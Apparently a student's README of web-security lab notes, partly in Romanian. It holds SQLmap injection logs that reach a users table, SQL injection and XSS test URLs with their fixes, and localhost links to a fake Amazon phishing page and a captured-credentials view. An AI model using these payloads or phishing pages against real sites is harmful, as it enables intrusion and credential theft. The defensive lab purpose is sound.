Log file analizer usage:

```
# Show 4xx errors
python log_analyzer.py 1

# Show URL statistics
python log_analyzer.py 2

# Watch logs in real-time
python log_analyzer.py 3

# Specify a different log directory
python log_analyzer.py 2 --log-dir /path/to/logs
```

Lab 4:
The logs are showing us that SQLmap is testing for SQL injection on GET parameter 'nume'. It tried different attacks and it successfully extracted the users table. 


```
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28LENGTH%28SYSDATE%29%3DLENGTH%28SYSDATE%29%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%2CNULL%20FROM%20DUAL--%20rqBU ::1 200 info: Searching for: Ion' UNION ALL SELECT CHR(113)||CHR(118)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (LENGTH(SYSDATE)=LENGTH(SYSDATE)) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(120)||CHR(122)||CHR(113),NULL FROM DUAL-- rqBU
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28LENGTH%28SYSDATE%29%3DLENGTH%28SYSDATE%29%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%2CNULL%20FROM%20DUAL--%20rqBU ::1 200 error: Redirecting to login page: Database error: SQLITE_ERROR: no such table: DUAL
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /api/login ::1 200 info: Login page
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28CONVERT_TO%28%27QXrQ%27%2CQUOTE_IDENT%28NULL%29%29%20IS%20NULL%29%20THEN%20%28CHR%2849%29%29%20ELSE%20%28CHR%2848%29%29%20END%29%29%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2CNULL--%20IARt ::1 200 info: Searching for: Ion' UNION ALL SELECT (CHR(113)||CHR(118)||CHR(107)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (CONVERT_TO('QXrQ',QUOTE_IDENT(NULL)) IS NULL) THEN (CHR(49)) ELSE (CHR(48)) END))||(CHR(113)||CHR(112)||CHR(120)||CHR(122)||CHR(113)),NULL-- IARt
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28CONVERT_TO%28%27QXrQ%27%2CQUOTE_IDENT%28NULL%29%29%20IS%20NULL%29%20THEN%20%28CHR%2849%29%29%20ELSE%20%28CHR%2848%29%29%20END%29%29%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%2CNULL--%20IARt ::1 200
 error: Redirecting to login page: Database error: SQLITE_ERROR: no such function: CHR
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /api/login ::1 200 info: Login page
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28UNICODE%28SQUARE%28NULL%29%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL--%20HkCf ::1 200 info: Searching for: Ion' UNION ALL SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(112)+CHAR(113)+(CASE WHEN (UNICODE(SQUARE(NULL)) IS NULL) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(112)+CHAR(120)+CHAR(122)+CHAR(113),NULL-- HkCf
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28UNICODE%28SQUARE%28NULL%29%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL--%20HkCf ::1 200 error: Redirecting to login page: Database error: SQLITE_ERROR: no such function: SQUARE
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /api/login ::1 200 info: Login page
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20CHAR%28113%2C118%2C107%2C112%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C112%2C120%2C122%2C113%29%2CNULL--%20ksZP ::1 200 info: Searching for: Ion' UNION ALL SELECT CHAR(113,118,107,112,113)||(SELECT (CASE WHEN (LAST_INSERT_ROWID()=LAST_INSERT_ROWID()) THEN 1 ELSE 0 END))||CHAR(113,112,120,122,113),NULL-- ksZP
2025-01-04 10:01:01 [5164] DESKTOP-7G6ED05 GET /cauta?nume=Ion%27%20UNION%20ALL%20SELECT%20CHAR%28113%2C118%2C107%2C112%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C112%2C120%2C122%2C113%29%2CNULL--%20ksZP ::1 200 info: Rendering cauta page
```

```
[10:01:01] [INFO] the back-end DBMS is SQLite
[10:01:01] [INFO] fetching banner
web application technology: Express
back-end DBMS: SQLite
banner: '3.44.2'
[10:01:01] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[2 tables]
+-----------------+
| sqlite_sequence |
| users           |
+-----------------+

```
SQLite integration tutorial: https://www.sqlitetutorial.net/sqlite-nodejs/


Lab5:
Possible problems and how to solve it:
```
Access to fetch at 'http://localhost:5000/api/data' from origin 'http://localhost:4567' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled
```

Lab6:
URL vulnerabil:
```
http://localhost:4567/cauta?q=' OR '1'='1
```
In acest caz, query-ul devine ```SELECT * FROM users WHERE name = '' OR '1'='1' ``` si ```OR '1'='1'``` este mereu adevarat, deci ne vor fi returnati toti utilizatorii din tabelul users. Pentru a rezolva problema SQL injection, trebuie sa sanitizam datele, de exemplu prin utilizarea Sequelize. Aceasta sanitizare se face si automat cu ajutorul sqlite.

URL vulnerabil:
```
http://localhost:4567/cauta?q=<script type="text/javascript">alert("vulnerable");</script>
```
Acsta va realiza un pop up de tip alerta in care se va mentiona ca siteul este vulnerabil. Pentru a preveni acest tip de atac trebuie sa utilizam ```<%= %>``` în loc de ```<%- %>```. De asemenea, ar trebui sa sanitizam datele primite din query.


You need to enable CORS on the server where the API is hosted (http://127.0.0.1:5000)

Lab10:
Link to see the phishing email: http://localhost:5000/api/email
Link to the fake amazon phishing page: http://localhost:5000/api/phishing
Link to view the credentials sent to the server: http://localhost:5000/api/view-credentials